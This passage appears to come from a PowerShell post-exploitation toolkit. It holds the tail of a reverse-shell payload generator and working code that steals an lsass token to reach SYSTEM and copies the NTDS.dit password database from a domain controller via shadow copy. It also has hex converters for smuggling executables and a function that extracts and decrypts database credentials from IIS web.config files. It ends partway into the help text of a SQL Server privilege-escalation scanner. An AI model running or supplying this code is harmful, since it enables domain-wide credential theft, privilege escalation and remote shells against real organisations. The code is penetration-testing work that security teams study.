$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
'@
        $script = $part1 + $part2
        switch ($Output)
        {
            'Encoded' {ConvertTo-PostBase64Command -Command $script}
            'Script' {$script}
        }
        
    }
    End
    {
    }
}


<#
.SYNOPSIS
   Copies the NTDS.dit file from a Domain Controller using Volume Shadow Copy
.DESCRIPTION
   Copies the NTDS.dit file from a Domain Controller using Volume Shadow Copy. 
   It can generate either a compressed encoded command or a script that can be
   modiefied depending on the needs for post exploitation. It will copy the 
   file by default to $env:TEMP. 
#>
function Get-PostCopyNTDS
{
    [CmdletBinding()]
    Param
    (
        [validateset("Encoded","Script")]
        [string]$Output = "Encoded"
    
    )

    $script = @'

$sign = @"
using System;
using System.Runtime.InteropServices;
public static class priv
{
    [DllImport("shell32.dll")]
    public static extern bool IsUserAnAdmin();
}

"@

$adminasembly = Add-Type -TypeDefinition $sign -Language CSharp -PassThru

function Get-SystemToken
{
$signature = @" 
    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
     public struct TokPriv1Luid 
     { 
         public int Count; 
         public long Luid; 
         public int Attr; 
     } 
 
    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
    public const int TOKEN_QUERY = 0x00000008; 
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
 
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
      TOKEN_ADJUST_SESSIONID); 
 
    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
    public const int ANYSIZE_ARRAY = 1; 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID 
    { 
      public UInt32 LowPart; 
      public UInt32 HighPart; 
    } 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID_AND_ATTRIBUTES { 
       public LUID Luid; 
       public UInt32 Attributes; 
    } 
 
 
    public struct TOKEN_PRIVILEGES { 
      public UInt32 PrivilegeCount; 
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
      public LUID_AND_ATTRIBUTES [] Privileges; 
    } 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken( 
      IntPtr PHThread, 
      IntPtr Token 
    ); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     [return: MarshalAs(UnmanagedType.Bool)] 
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
       UInt32 DesiredAccess, out IntPtr TokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError = true)] 
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
 
    [DllImport("kernel32.dll", ExactSpelling = true)] 
    public static extern IntPtr GetCurrentProcess(); 
 
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
"@ 
 
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
    Write-Warning "Run the Command as an Administrator" 
    Break 
    } 
 
    Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
    $adjPriv = [AdjPriv.AdjPriv] 
    [long]$luid = 0 
 
    $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
    $tokPriv1Luid.Count = 1 
    $tokPriv1Luid.Luid = $luid 
    $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
 
    $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
  
    [IntPtr]$htoken = [IntPtr]::Zero 
    $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
   
   
    $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
    $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
 
    if(-not($retVal)) { 
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
    Break 
    } 
 
    $process = (Get-Process -Name lsass) 
    #$process.name
    [IntPtr]$hlsasstoken = [IntPtr]::Zero 
    $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
 
    [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
    $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
  
    $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
  
    if(-not($retVal)) { 
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
    } 
}

function Copy-RawItem
{

    [CmdletBinding()]
    Param (
        [String]
        $Path,
        [String]
        $Destination,
        [Switch]
        $FailIfExists
    )
    $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')}
    $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native')
    $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static')) 
    $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists'])))
    $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    if ($CopyResult -eq $False -and $HResult -ne 0)
    {
        throw ( New-Object ComponentModel.Win32Exception )
    }
    else
    {
        Write-Output (Get-ChildItem $Destination)
    }
}


function Copy-NTDSDit
{
    $service=(Get-Service -name VSS)
    if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
    $id = ( Get-WMIObject -list win32_shadowcopy).Create($env:SystemDrive,"ClientAccessible").ShadowID
    $volume=(Get-WMIObjectwin32_shadowcopy -filter "ID='$id'")
    Copy-RawItem -Path "$($volume.DeviceObject)\Windows\NTDS\ntds.dit" -Destination $env:TEMP
    $volume.Delete();if($notrunning -eq 1){$service.Stop()}
    write-host "Copied to $($env:TEMP)"
}


if ([priv]::IsUserAnAdmin())
{
    $IsDC = (Get-Service -Name KDC -ErrorAction SilentlyContinue)
    if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
    {
        if ($IsDC)
        {
            Copy-NTDSDit
        }
        else
        {
            Write-Host "Server is not a Domain Controller"
        }
    }
    else
    {
        Get-SystemToken
        if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
        {
            if ($IsDC)
            {
                Copy-NTDSDit
            }
            else
            {
                Write-Host "Server is not a Domain Controller"
            }
        }
    }
}
else
{
    Write-Error "Administrator or System privelages necessary."
}


'@
    switch ($Output)
    {
        'Encoded' {Compress-PostScript -Command $script}
        'Script' {$script}
    }
}


<#
.Synopsis
   Converts a PE File or none signed file in a Hex Byte String
.DESCRIPTION
   Converts a PE File or none signed file in a Hex Byte String. The outout can be saved
   in to a text file that can be later converted back to it's original format 
   with ConvertTo-PostHextoFile. Some signed executables tend to not work after conversion.
.EXAMPLE

   ConvertTo-PostFiletoHex -File C:\Windows\System32\cmd.exe -OutFile C:\note2.txt

   Convert cmd.exe in to a text file named note2.txt

#>
function ConvertTo-PostFiletoHex
{
    [CmdletBinding()]
    [OutputType([byte])]
    Param
    (
        # File to encode in to Hex
        [Parameter(Mandatory=$true,
                  ValueFromPipeline=$true,
                  Position=0)]
        [ValidateScript({Test-Path $_})]
		$File,

        # File to save the Hex encoded file.
        [String]
        $OutFile
    )

    Begin
    {
    }
    Process
    {
        [Byte[]] $hex = get-content -encoding byte -path $File

        if ($OutFile)
        {
            [System.IO.File]::WriteAllLines($OutFile, ([String]$hex))
        }
        else
        {
            Write-Output [String]$hex
        }
    }
    End
    {
    }
}


<#
.Synopsis
   Converts a file with a Hex Byte representation to it original format.
.DESCRIPTION
   Converts a file with a Hex Byte representation to it original format.
.EXAMPLE
    ConvertTo-PostHextoFile -File C:\note2.txt -OutFile C:\note2.exe
    PS C:\> Get-Item C:\note2.exe | select -ExpandProperty VersionInfo | fl *


    Comments           : 
    CompanyName        : Microsoft Corporation
    FileBuildPart      : 9200
    FileDescription    : Windows Command Processor
    FileMajorPart      : 6
    FileMinorPart      : 2
    FileName           : C:\note2.exe
    FilePrivatePart    : 16384
    FileVersion        : 6.2.9200.16384 (win8_rtm.120725-1247)
    InternalName       : cmd
    IsDebug            : False
    IsPatched          : False
    IsPrivateBuild     : False
    IsPreRelease       : False
    IsSpecialBuild     : False
    Language           : English (United States)
    LegalCopyright     : © Microsoft Corporation. All rights reserved.
    LegalTrademarks    : 
    OriginalFilename   : Cmd.Exe.MUI
    PrivateBuild       : 
    ProductBuildPart   : 9200
    ProductMajorPart   : 6
    ProductMinorPart   : 2
    ProductName        : Microsoft® Windows® Operating System
    ProductPrivatePart : 16384
    ProductVersion     : 6.2.9200.16384
    SpecialBuild       : 

   Converts a copy of cmd.exe converted to Hex Byte representation in note2.txt to an exe.
#>

function ConvertTo-PostHextoFile
{
    [CmdletBinding()]
    [OutputType([byte])]
    Param
    (
        # File to encode in to Hex
        [Parameter(Mandatory=$true,
                  ValueFromPipeline=$true,
                  Position=0)]
        [ValidateScript({Test-Path $_})]
		$File,

        # File to save the Hex encoded file.
        [String]
        $OutFile
    )

    Begin
    {
    }
    Process
    {
        [string]$hex = Get-Content -path $File
        [Byte[]] $temp = $hex -split ' '
        [System.IO.File]::WriteAllBytes($OutFile, $temp)
    }
    End
    {
    }
}

function Get-Webconfig
{	
    # Author: Scott Sutherland - 2014, NetSPI
    # Author: Antti Rantasaari - 2014, NetSPI
    # Version: get-webconfig.ps1 v1.0
	
    <#
	    .SYNOPSIS
	       This script will recover cleartext and encrypted connection strings from all web.config 
           files on the system.  Also, it will decrypt them if needed.
	   
	    .DESCRIPTION
	       This script will identify all of the web.config files on the system and recover the  
	       connection strings used to support authentication to backend databases.  If needed, the 
	       script will also decrypt the connection strings on the fly.  The output supports the 
	       pipeline which can be used to convert all of the results into a pretty table by piping 
	       to format-table.
	   
	    .EXAMPLE
	       Return a list of cleartext and decrypted connect strings from web.config files.
	   
	       PS C:\>get-webconfig 	   

	       user   : s1admin
	       pass   : s1password
	       dbserv : 192.168.1.103\server1
	       vdir   : C:\test2
	       path   : C:\test2\web.config
	       encr   : No
	       
	       user   : s1user
	       pass   : s1password
	       dbserv : 192.168.1.103\server1
	       vdir   : C:\inetpub\wwwroot
	       path   : C:\inetpub\wwwroot\web.config
	       encr   : Yes
	   
	    .EXAMPLE
	       Return a list of clear text and decrypted connect strings from web.config files.
	   
	       PS C:\>get-webconfig | Format-Table -Autosize
	       
	       user    pass       dbserv                vdir               path                          encr
	       ----    ----       ------                ----               ----                          ----
	       s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
	       s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
	       s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
	       s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
	       s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 

	     .LINK
	       http://www.netspi.com
	       https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
	       http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
	       http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx	

	     .NOTES
	       Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
	       for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
	    #>


    # Check if appcmd.exe exists
    if (Test-Path  ("c:\windows\system32\inetsrv\appcmd.exe"))
    {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $DataTable.Columns.Add("user") | Out-Null
        $DataTable.Columns.Add("pass") | Out-Null  
        $DataTable.Columns.Add("dbserv") | Out-Null
        $DataTable.Columns.Add("vdir") | Out-Null
        $DataTable.Columns.Add("path") | Out-Null
        $DataTable.Columns.Add("encr") | Out-Null

        # Get list of virtual directories in IIS 
        c:\windows\system32\inetsrv\appcmd.exe list vdir /text:physicalpath | 
        foreach { 

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*")
            {            
                $EnvarName = "`$env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]            
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | 
            foreach{
            
                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add)
                {
                                
                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add| 
                    foreach {

                        [string]$MyConString = $_.connectionString  
                        $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                        $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                        $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                        $ConfVdir = $CurrentVdir
                        $ConfPath = $CurrentPath
                        $ConfEnc = "No"
                        $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc) | Out-Null                    
                    }  

                }else{

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $aspnet_regiis_path = Get-ChildItem -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | Sort-Object -Descending  |  select fullname -First 1              

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($aspnet_regiis_path.FullName))
                    {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (get-item $env:temp).FullName + "\web.config"

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) 
                        { 
                            Del $WebConfigPath 
                        }
                    
                        # Copy web.config from vdir to user temp for decryption
                        Copy $CurrentPath $WebConfigPath

                        #Decrypt web.config in user temp                 
                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $env:temp).FullName'
                        invoke-expression $aspnet_regiis_cmd | Out-Null

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add)
                        {
                                
                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add| 
                            foreach {

                                [string]$MyConString = $_.connectionString  
                                $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                $ConfVdir = $CurrentVdir
                                $ConfPath = $CurrentPath
                                $ConfEnc = "Yes"
                                $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc) | Out-Null                    
                            }  

                        }else{
                            Write-Error "Decryption of $CurrentPath failed."                        
                        }
                    }else{
                        Write-Error "aspnet_regiis.exe does not exist in the default location."
                    }
                }           
            }
        }

        # Check if any connection strings were found 
        if( $DataTable.rows.Count -gt 0 )
        {

            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | select user,pass,dbserv,vdir,path,encr -Unique       
        }else{

            # Status user
            Write-Error "No connectionStrings found."
        }     

    }else{
        Write-Error "Appcmd.exe does not exist in the default location."
    }

}

function Get-SQLServerAccess
{
	
    # Author: Scott Sutherland 2013, NetSPI
    # Version: Get-SQLServerAccess v.1
    # Requirements: Powershell v.3

	<#
	.SYNOPSIS
	   This script obtains a list of all of the SQL Server instances registered on
	   the domain by querying a domain controller for MSSQLsvc Service Principle
	   Names.  Then it checks if the current or provided user has access to the SQL
	   Server instances found. Finally, it queries accessible SQL Server instances 
	   for basic information that could be used to escalate privileges on the server 
	   such as sysadmin privileges, shared service accounts, service 
	   accounts configured with Domain Admin privileges, and database links. 

	.DESCRIPTION
	   This module obtains a list of all of the SQL Server instances registered on
	   the domain by querying a domain controller for MSSQLsvc Service Principle
	   Names.  Then it checks if the current or provided user has access to the SQL
	   Server instances found. Finally, it queries accessible SQL Server instances 
	   for basic information that could be used to escalate privileges on the server 
	   such as sysadmin privileges, shared service accounts, service 
	   accounts configured with Domain Admin privileges, and database links.  
	   An option has also been added so a custom query can be defined by the user.
	   The module allows users authenticate to the SQL Server instances as the 
	   current domain user or a provided SQL user.  Alternative domain credentials 
	   can also be used via the Windows RunAs command.

	.EXAMPLE
	   Returns a list of SQL Server instances on the current user's domain that they have
	   access to.  This is the default output.
	   
	   PS C:\Get-SQLServerAccess
	   [*] ----------------------------------------------------------------------
	   [*] Start Time: 04/09/2014 17:02:33
	   [*] Domain: mydomain.com
	   [*] DC: dc1.mydomain.com
	   [*] Getting list of SQL Server instances from DC as mydomain\myuser...
	   [*] 5 SQL Server instances found in LDAP.
	   [*] Attempting to login into 5 SQL Server instances as mydomain\myuser...
	   [*] ----------------------------------------------------------------------
	   [-] Failed   - server1.mydomain.com is not responding to pings
	   [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
	   [+] SUCCESS! - server3.mydomain.com,1433 (192.168.1.103) - Sysadmin: No - SvcIsDA: No 
	   [+] SUCCESS! - server3.mydomain.com\SQLEXPRESS (192.168.1.103) - Sysadmin: No - SvcIsDA: No
	   [+] SUCCESS! - server4.mydomain.com\AppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes             
	   [*] ----------------------------------------------------------------------
	   [*] 3 of 5 SQL Server instances could be accessed.        
	   [*] End Time: 04/03/2014 10:58:00      
	   [*] Total Time: 00:03:00
	   [*] ----------------------------------------------------------------------

    .EXAMPLE
	   Returns a list of SQL Server instances imported from a file and on the current 
	   user's domain that they have access to.
	   
	   PS C:\Get-SQLServerAccess -File c:\Temp\Servers.txt
	   [*] ----------------------------------------------------------------------
	   [*] Start Time: 04/09/2014 17:02:33
	   [*] Domain: mydomain.com
	   [*] DC: dc1.mydomain.com
	   [*] Getting list of SQL Server instances from DC as mydomain\myuser...
	   [*] 2 SQL Server instances found in LDAP.
	   [*] 3 SQL Server instances found in c:\Temp\Servers.txt.
	   [*] Attempting to login into 5 SQL Server instances as mydomain\myuser...
	   [*] ----------------------------------------------------------------------
	   [-] Failed   - server1.mydomain.com is not responding to pings
	   [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
	   [+] SUCCESS! - server3.mydomain.com,1433 (192.168.1.103) - Sysadmin: No - SvcIsDA: No 
	   [+] SUCCESS! - server3.mydomain.com\SQLEXPRESS (192.168.1.103) - Sysadmin: No - SvcIsDA: No
	   [+] SUCCESS! - server4.mydomain.com\AppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes             
	   [*] ----------------------------------------------------------------------
	   [*] 3 of 5 SQL Server instances could be accessed.        
	   [*] End Time: 04/03/2014 10:58:00      
	   [*] Total Time: 00:03:00
	   [*] ----------------------------------------------------------------------

	.EXAMPLE
	   Returns a list of SQL Server instances on the current user's domain and 
	   attempts to authenticate to them using provided SQL Server credentials.
	   
	   PS C:\Get-SQLServerAccess -SQLUser test -SQLPass $up3r$3cur3P@$$w0rd
	   [*] ----------------------------------------------------------------------
	   [*] Start Time: 04/09/2014 17:02:33
	   [*] Domain: mydomain.com
	   [*] DC: dc1.mydomain.com
	   [*] Getting list of SQL Server instances from DC as mydomain\myuser...
	   [*] 5 SQL Server instances found in LDAP.
	   [*] Attempting to login into 5 SQL Server instances as test...
	   [*] ----------------------------------------------------------------------
	   [-] Failed   - server1.mydomain.com is not responding to pings
	   [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
	   [+] Failed   - server3.mydomain.com,1433 (192.168.1.103) - is up, but authentication/query failed
	   [+] Failed   - server3.mydomain.com\SQLEXPRESS (192.168.1.103) - is up, but authentication/query failed
	   [+] SUCCESS! - server4.mydomain.com\AppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes             
	   [*] ----------------------------------------------------------------------
	   [*] 1 of 5 SQL Server instances could be accessed.        
	   [*] End Time: 04/03/2014 10:58:00      
	   [*] Total Time: 00:03:00
	   [*] ----------------------------------------------------------------------

	.EXAMPLE
	   Returns a list of SQL Server instances on the current user's domain that they have
	   access to.  This also displays a data table object at the end that can feed the 
	   pipeline.  You can make it pretty using the format-table syntax example below.
	   
	   PS C:\Get-SQLServerAccess -ShowSum | format-table -AutoSize 
 	   [*] ----------------------------------------------------------------------
	   [*] Start Time: 04/09/2014 17:02:33
 	   [*] Domain: mydomain.com
	   [*] DC: dc1.mydomain.com
	   [*] Getting list of SQL Server instances from DC as mydomain\myuser...
	   [*] 5 SQL Server instances found in LDAP.
	   [*] Attempting to login into 5 SQL Server instances as mydomain\myuser...
	   [*] ----------------------------------------------------------------------
	   [-] Failed   - server1.mydomain.com is not responding to pings
	   [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
	   [+] SUCCESS! - server3.mydomain.com,1433 (192.168.1.103) - Sysadmin: No - SvcIsDA: No 
	   [+] SUCCESS! - server3.mydomain.com\SQLEXPRESS (192.168.1.103) - Sysadmin: No - SvcIsDA: No
	   [+] SUCCESS! - server4.mydomain.com\AppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes             
	   [*] ----------------------------------------------------------------------
 	   [*] 3 of 5 SQL Server instances could be accessed.        
 	   [*] End Time: 04/03/2014 10:58:00      
	   [*] Total Time: 00:03:00
	   [*] ----------------------------------------------------------------------

	   IpAddress      Server                      Instance                                   SQLVer                 OsVer      Sysadmin SvcAcct                     SvcIsDA IsClustered DBLinks
	   ---------      ------                      --------                                   ------                 -----      -------- -------                     ------- ----------- -------           
	   192.168.1.103  server3.mydomain.com        server3.mydomain.com,1433                  2008 Express Edition   7/2008     No       NT AUTHORITY\NETWORKSERVICE No      No          4      
	   192.168.1.103  server3.mydomain.com        server3.mydomain.com\SQLEXPRESS            2008 Express Edition   7/2008     No       NT AUTHORITY\LocalSystem    No      No          1      
	   192.168.1.104  server4.mydomain.com        server4.mydomain.com\AppData               2005 Standard Edition  2003       Yes      NT AUTHORITY\sql_svc        Yes     No          0   

	.EXAMPLE
	   Returns a list of SQL Server instances on the current user's domain that they have
	   access to.  This will display the default output, but also write the results to a 
	   CSV file.
	   
	   PS C:\Get-SQLServerAccess -ShowSum | export-csv c:\temp\mysqlaccess.csv
	   [*] ----------------------------------------------------------------------
	   [*] Start Time: 04/09/2014 17:02:33
	   [*] Domain: mydomain.com
	   [*] DC: dc1.mydomain.com
	   [*] Getting list of SQL Server instances from DC as mydomain\myuser...
	   [*] 5 SQL Server instances found in LDAP.
	   [*] Attempting to login into 5 SQL Server instances as mydomain\myuser...
	   [*] ----------------------------------------------------------------------
	   [-] Failed   - server1.mydomain.com is not responding to pings
	   [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
	   [+] SUCCESS! - server3.mydomain.com,1433 (192.168.1.103) - Sysadmin: No - SvcIsDA: No 
	   [+] SUCCESS! - server3.mydomain.com\SQLEXPRESS (192.168.1.103) - Sysadmin: No - SvcIsDA: No
	   [+] SUCCESS! - server4.mydomain.com\AppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes             
	   [*] ----------------------------------------------------------------------
	   [*] 3 of 5 SQL Server instances could be accessed.        
	   [*] End Time: 04/03/2014 10:58:00      
	   [*] Total Time: 00:03:00
	   [*] ----------------------------------------------------------------------
        
	.EXAMPLE
	   Returns a list of SQL Server instances on the current user's domain that they have
	   access to.  This will display the default output, but also display a data table of
	   SQL Servers that are accessible every time a successful connection is made.
	   
	   PS C:\Get-SQLServerAccess -ShowStatus 
	   [*] ----------------------------------------------------------------------
	   [*] Start Time: 04/09/2014 17:02:33
	   [*] Domain: mydomain.com
	   [*] DC: dc1.mydomain.com
	   [*] Getting list of SQL Server instances from DC as mydomain\myuser...
	   [*] 5 SQL Server instances found in LDAP.
	   [*] Attempting to login into 5 SQL Server instances as mydomain\myuser...
	   [*] ----------------------------------------------------------------------
	   [-] Failed   - server1.mydomain.com is not responding to pings
	   [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
	   [+] SUCCESS! - server3.mydomain.com,1433 (192.168.1.103) - Sysadmin: No - SvcIsDA: No 

	   IpAddress      Server                      Instance                                   SQLVer                 OsVer      Sysadmin SvcAcct                     SvcIsDA IsClustered DBLinks
	   ---------      ------                      --------                                   ------                 -----      -------- -------                     ------- ----------- -------           
	   192.168.1.103  server3.mydomain.com        server3.mydomain.com,1433                  2008 Express Edition   7/2008     No       NT AUTHORITY\NETWORKSERVICE No      No          4                
        
	   [+] SUCCESS! - server3.mydomain.com\SQLEXPRESS (192.168.1.103) - Sysadmin: No - SvcIsDA: No

	   IpAddress      Server                      Instance                                   SQLVer                 OsVer      Sysadmin SvcAcct                     SvcIsDA IsClustered DBLinks
	   ---------      ------                      --------                                   ------                 -----      -------- -------                     ------- ----------- -------           
	   192.168.1.103  server3.mydomain.com        server3.mydomain.com,1433                  2008 Express Edition   7/2008     No       NT AUTHORITY\NETWORKSERVICE No      No          4      
	   192.168.1.103  server3.mydomain.com        server3.mydomain.com\SQLEXPRESS            2008 Express Edition   7/2008     No       NT AUTHORITY\LocalSystem    No      No          1                                 
          
	   [+] SUCCESS! - server4.mydomain.com\AppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes       
        
	   IpAddress      Server                      Instance                                   SQLVer                 OsVer      Sysadmin SvcAcct                     SvcIsDA IsClustered DBLinks
	   ---------      ------                      --------                                   ------                 -----      -------- -------                     ------- ----------- -------           
	   192.168.1.103  server3.mydomain.com        server3.mydomain.com,1433                  2008 Express Edition   7/2008     No       NT AUTHORITY\NETWORKSERVICE No      No          4      
	   192.168.1.103  server3.mydomain.com        server3.mydomain.com\SQLEXPRESS            2008 Express Edition   7/2008     No       NT AUTHORITY\LocalSystem    No      No          1      
	   192.168.1.104  server4.mydomain.com        server4.mydomain.com\AppData               2005 Standard Edition  2003       Yes      NT AUTHORITY\sql_svc        Yes     No          0                              
             
	   [*] ----------------------------------------------------------------------
	   [*] 3 of 5 SQL Server instances could be accessed.        
	   [*] End Time: 04/03/2014 10:58:00      
	   [*] Total Time: 00:03:00
	   [*] ----------------------------------------------------------------------    
        
	.EXAMPLE
	   Returns a list of SQL Server instances on the current user's domain that they have
	   access to.  This will display the default output, but also display the results of
	   a custom query defined by the user.
	   
	   PS C:\Get-SQLServerAccess -query "select name as 'Databases' from master..sysdatabases where HAS_DBACCESS(name) = 1"
 	   [*] ----------------------------------------------------------------------
	   [*] Start Time: 04/09/2014 17:02:33
	   [*] Domain: mydomain.com
	   [*] DC: dc1.mydomain.com
	   [*] Getting list of SQL Server instances from DC as mydomain\myuser...
	   [*] 5 SQL Server instances found in LDAP.
	   [*] Attempting to login into 5 SQL Server instances as mydomain\myuser...
	   [*] ----------------------------------------------------------------------
	   [-] Failed   - server1.mydomain.com is not responding to pings
	   [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
